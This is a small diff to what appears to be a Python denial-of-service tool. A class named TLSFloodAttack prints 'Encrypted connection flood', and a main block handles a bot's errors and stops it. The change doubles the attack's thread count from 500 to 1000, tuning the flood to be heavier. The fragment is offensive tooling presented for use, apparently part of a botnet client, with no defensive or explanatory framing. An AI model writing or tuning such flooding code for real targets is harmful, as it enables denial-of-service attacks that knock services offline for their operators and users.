@@ -1880,7 +1880,7 @@ class TLSFloodAttack:
         print(f"[+] Protocol: TLS/SSL")
         print("[+] Attack Type: Encrypted connection flood")
         
-        num_threads = 500  # Adjust based on system capabilities
+        num_threads = 1000  # Adjust based on system capabilities
         
         self.threads = []
         for i in range(num_threads):
@@ -2783,3 +2783,4 @@ if __name__ == "__main__":
     except Exception as e:
         print(f"[-] Bot error: {e}")
         bot.stop()
+
